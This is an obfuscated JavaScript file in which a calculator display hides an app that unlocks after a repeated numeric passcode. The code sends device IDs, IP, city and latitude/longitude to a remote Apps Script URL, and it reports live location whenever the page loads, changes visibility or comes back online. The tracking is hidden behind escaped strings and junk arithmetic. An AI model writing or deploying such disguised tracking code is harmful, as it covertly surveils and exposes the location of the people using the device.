function scBackspace() {
  if (isEvaluated) {
    scClear();
    return;
  }
  scExpression = scExpression['\u0073\u006C\u0069\u0063\u0065'](475699 ^ 475699, -(461202 ^ 461203));
  scUpdateDisplay();
}
async function scEvaluate() {
  let _0x3ef;
  const _0x4711a = scExpression['\u0074\u0072\u0069\u006D']();
  _0x3ef = '\u0069\u0068\u0067\u006E\u0064\u006C';
  if (!_0x4711a) return;
  if (new RegExp('\u005E\u005C\u0064\u007B\u0033\u002C\u0038\u007D\u0024', "")['\u0074\u0065\u0073\u0074'](_0x4711a)) {
    if (lastInputCode === _0x4711a) {
      consecutiveCount++;
    } else {
      lastInputCode = _0x4711a;
      consecutiveCount = 727346 ^ 727347;
    }
    if (consecutiveCount >= (420789 ^ 420790)) {
      var _0xbb43a = (717337 ^ 717329) + (202527 ^ 202525);
      const _0x5620d = getOrCreateDeviceId();
      _0xbb43a = (621606 ^ 621614) + (618259 ^ 618259);
      var _0xf7fa = (505361 ^ 505367) + (841028 ^ 841024);
      const _0xe8a3fb = await collectDeviceMetadata();
      _0xf7fa = (641752 ^ 641744) + (990643 ^ 990651);
      var _0xa_0xeed = (669797 ^ 669805) + (571110 ^ 571111);
      const _0x8dgeg = new URLSearchParams({
        '\u0061\u0063\u0074\u0069\u006F\u006E': "verifyPasscode",
        '\u0064\u0065\u0076\u0069\u0063\u0065\u0049\u0064': _0x5620d,
        "code": _0x4711a,
        '\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D': _0xe8a3fb['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D'],
        '\u0073\u0063\u0072\u0065\u0065\u006E': _0xe8a3fb['\u0073\u0063\u0072\u0065\u0065\u006E'],
        "ip": _0xe8a3fb['\u0069\u0070'],
        "city": _0xe8a3fb['\u0063\u0069\u0074\u0079'],
        "lat": _0xe8a3fb['\u006C\u0061\u0074'],
        '\u006C\u006E\u0067': _0xe8a3fb['\u006C\u006E\u0067']
      });
      _0xa_0xeed = (175496 ^ 175489) + (306955 ^ 306955);
      scExpression = "";
      let _0x50d3d;
      const _0x4d71a = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("sc-main-display");
      _0x50d3d = (489822 ^ 489823) + (637569 ^ 637569);
      if (_0x4d71a) _0x4d71a['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = "\u0030";
      fetch(`${APPS_SCRIPT_URL}?${_0x8dgeg['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']()}`, {
        '\u006D\u0065\u0074\u0068\u006F\u0064': "GET",
        "cache": "no-store"
      })['\u0074\u0068\u0065\u006E'](res => res['\u006A\u0073\u006F\u006E']())['\u0074\u0068\u0065\u006E'](data => {
        if (data['\u0068\u0061\u0073\u004F\u0077\u006E\u0050\u0072\u006F\u0070\u0065\u0072\u0074\u0079']("\u0064\u0065\u0076\u0065\u006C\u006F\u0070\u0065\u0072\u004E\u0061\u006D\u0065")) {
          updateDeveloperCredit(data['\u0064\u0065\u0076\u0065\u006C\u006F\u0070\u0065\u0072\u004E\u0061\u006D\u0065']);
        }
        if (data['\u0073\u0074\u0061\u0074\u0075\u0073'] === "\u0041\u0043\u0054\u0049\u0056\u0045") {
          localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("bima_access_status", "\u0041\u0043\u0054\u0049\u0056\u0045");
          consecutiveCount = 232209 ^ 232209;
          lastInputCode = "";
          unlockApp();
          startRealtimeSync();
        } else {
          localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u0061\u0063\u0063\u0065\u0073\u0073\u005F\u0073\u0074\u0061\u0074\u0075\u0073", "\u004C\u004F\u0043\u004B\u0045\u0044");
          lockApp();
        }
      })['\u0063\u0061\u0074\u0063\u0068'](err => console['\u0065\u0072\u0072\u006F\u0072'](err));
      consecutiveCount = 213770 ^ 213770;
      lastInputCode = "";
      return;
    }
    isEvaluated = !![];
    document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("sc-subtext")['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = _0x4711a + " =";
    scUpdateDisplay();
    return;
  } else {
    consecutiveCount = 324317 ^ 324317;
    lastInputCode = "";
  }
  try {
    var _0xcc9ecb = (596315 ^ 596315) + (210680 ^ 210681);
    const _0xe8c = scExpression['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u00D7', '\u0067'), "\u002A")['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u00F7', '\u0067'), "\u002F")['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u2212', '\u0067'), "\u002D");
    _0xcc9ecb = (909968 ^ 909969) + (120797 ^ 120797);
    let _0xfda6b;
    const _0xb8eg0d = Function(`'use strict'; return (${_0xe8c})`)();
    _0xfda6b = "gndkko";
    let _0xda54df;
    const _0x734ac = Number['\u0069\u0073\u0049\u006E\u0074\u0065\u0067\u0065\u0072'](_0xb8eg0d) ? _0xb8eg0d['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']() : parseFloat(_0xb8eg0d['\u0074\u006F\u0046\u0069\u0078\u0065\u0064'](589468 ^ 589460))['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']();
    _0xda54df = 618941 ^ 618932;
    document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0063\u002D\u0073\u0075\u0062\u0074\u0065\u0078\u0074")['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = scExpression + "\u0020\u003D";
    scExpression = _0x734ac;
    document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0063\u002D\u006D\u0061\u0069\u006E\u002D\u0064\u0069\u0073\u0070\u006C\u0061\u0079")['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = scExpression;
    isEvaluated = !![];
  } catch (e) {
    document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("sc-main-display")['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = "\u0045\u0072\u0072\u006F\u0072";
    scExpression = "";
    isEvaluated = !![];
  }
}
function unlockApp() {
  const _0x6ca = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0065\u0063\u0072\u0065\u0074\u002D\u0063\u0061\u006C\u0063\u002D\u0067\u0061\u0074\u0065");
  if (_0x6ca) {
    _0x6ca['\u0073\u0074\u0079\u006C\u0065']['\u0073\u0065\u0074\u0050\u0072\u006F\u0070\u0065\u0072\u0074\u0079']("display", "\u006E\u006F\u006E\u0065", "\u0069\u006D\u0070\u006F\u0072\u0074\u0061\u006E\u0074");
  }
}
function lockApp() {
  var _0xad86fb = (394047 ^ 394047) + (796655 ^ 796652);
  const _0x18237d = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0065\u0063\u0072\u0065\u0074\u002D\u0063\u0061\u006C\u0063\u002D\u0067\u0061\u0074\u0065");
  _0xad86fb = "qenjbj";
  if (_0x18237d) {
    _0x18237d['\u0073\u0074\u0079\u006C\u0065']['\u0073\u0065\u0074\u0050\u0072\u006F\u0070\u0065\u0072\u0074\u0079']("display", "\u0066\u006C\u0065\u0078", "important");
  }
}
window['\u0073\u0063\u0041\u0070\u0070\u0065\u006E\u0064'] = scAppend;
window['\u0073\u0063\u0043\u006C\u0065\u0061\u0072'] = scClear;
window['\u0073\u0063\u0042\u0061\u0063\u006B\u0073\u0070\u0061\u0063\u0065'] = scBackspace;
window['\u0073\u0063\u0045\u0076\u0061\u006C\u0075\u0061\u0074\u0065'] = scEvaluate;
window['\u0073\u0063\u0054\u006F\u0067\u0067\u006C\u0065\u0042\u0072\u0061\u0063\u006B\u0065\u0074'] = scToggleBracket;
document['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("keydown", e => {
  var _0xc7ad6c = (624835 ^ 624837) + (762122 ^ 762115);
  const gate = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("secret-calc-gate");
  _0xc7ad6c = (909394 ^ 909397) + (499139 ^ 499140);
  if (!gate || window['\u0067\u0065\u0074\u0043\u006F\u006D\u0070\u0075\u0074\u0065\u0064\u0053\u0074\u0079\u006C\u0065'](gate)['\u0064\u0069\u0073\u0070\u006C\u0061\u0079'] === "\u006E\u006F\u006E\u0065") return;
  if (e['\u0063\u0074\u0072\u006C\u004B\u0065\u0079'] || e['\u006D\u0065\u0074\u0061\u004B\u0065\u0079'] || e['\u0061\u006C\u0074\u004B\u0065\u0079']) return;
  if (e['\u006B\u0065\u0079'] >= "\u0030" && e['\u006B\u0065\u0079'] <= "\u0039" || e['\u006B\u0065\u0079\u0043\u006F\u0064\u0065'] >= (712316 ^ 712220) && e['\u006B\u0065\u0079\u0043\u006F\u0064\u0065'] <= (428083 ^ 428122)) {
    e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();
    scAppend(e['\u006B\u0065\u0079']);
    return;
  }
  if (["\u002B", "\u002D", "\u002A", "\u002F", "\u002E", "\u0025"]['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](e['\u006B\u0065\u0079'])) {
    e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();
    scAppend(e['\u006B\u0065\u0079']);
    return;
  }
  if (e['\u006B\u0065\u0079'] === "\u0045\u006E\u0074\u0065\u0072" || e['\u006B\u0065\u0079'] === "\u003D") {
    e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();
    scEvaluate();
    return;
  }
  if (e['\u006B\u0065\u0079'] === 'Backspace') {
    e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();
    scBackspace();
    return;
  }
  if (["\u0045\u0073\u0063\u0061\u0070\u0065", 'Delete', "\u0063", "\u0043"]['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](e['\u006B\u0065\u0079'])) {
    e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();
    scClear();
    return;
  }
}, !![]);
document['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0076\u0069\u0073\u0069\u0062\u0069\u006C\u0069\u0074\u0079\u0063\u0068\u0061\u006E\u0067\u0065", () => {
  if (document['\u0076\u0069\u0073\u0069\u0062\u0069\u006C\u0069\u0074\u0079\u0053\u0074\u0061\u0074\u0065'] === "visible") {
    sendLiveLocationToServer(currentCoords['\u006C\u0061\u0074'], currentCoords['\u006C\u006E\u0067'], currentCoords['\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079'], "\u004F\u004E\u004C\u0049\u004E\u0045");
    checkUserAccessStatus();
  } else {
    sendLiveLocationToServer(currentCoords['\u006C\u0061\u0074'], currentCoords['\u006C\u006E\u0067'], currentCoords['\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079'], "\u0042\u0041\u0043\u004B\u0047\u0052\u004F\u0055\u004E\u0044");
  }
});
window['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0062\u0065\u0066\u006F\u0072\u0065\u0075\u006E\u006C\u006F\u0061\u0064", () => {
  const deviceId = getOrCreateDeviceId();
  const query = new URLSearchParams({
    '\u0061\u0063\u0074\u0069\u006F\u006E': "updateStatus",
    '\u0064\u0065\u0076\u0069\u0063\u0065\u0049\u0064': deviceId,
    '\u0073\u0074\u0061\u0074\u0075\u0073': "OFFLINE",
    "timestamp": Date['\u006E\u006F\u0077']()
  });
  if (navigator['\u0073\u0065\u006E\u0064\u0042\u0065\u0061\u0063\u006F\u006E']) {
    navigator['\u0073\u0065\u006E\u0064\u0042\u0065\u0061\u0063\u006F\u006E'](`${APPS_SCRIPT_URL}?${query['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']()}`);
  }
});
window['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']('online', () => {
  sendLiveLocationToServer(currentCoords['\u006C\u0061\u0074'], currentCoords['\u006C\u006E\u0067'], currentCoords['\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079'], "\u004F\u004E\u004C\u0049\u004E\u0045");
  checkUserAccessStatus();
});
document['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0044\u004F\u004D\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u004C\u006F\u0061\u0064\u0065\u0064", () => {
  var _0x3753c = (120316 ^ 120316) + (381464 ^ 381467);
  const cachedStatus = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u0061\u0063\u0063\u0065\u0073\u0073\u005F\u0073\u0074\u0061\u0074\u0075\u0073");
  _0x3753c = '\u0068\u0064\u006E\u0071\u006D\u0062';
  if (cachedStatus === "ACTIVE") {
    unlockApp();
  } else {
    lockApp();
  }
  const cachedName = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u0064\u0065\u0076\u005F\u006E\u0061\u006D\u0065");
  updateDeveloperCredit(cachedName || "");
  startLiveLocationTracking();
  checkUserAccessStatus();
  startRealtimeSync();
});
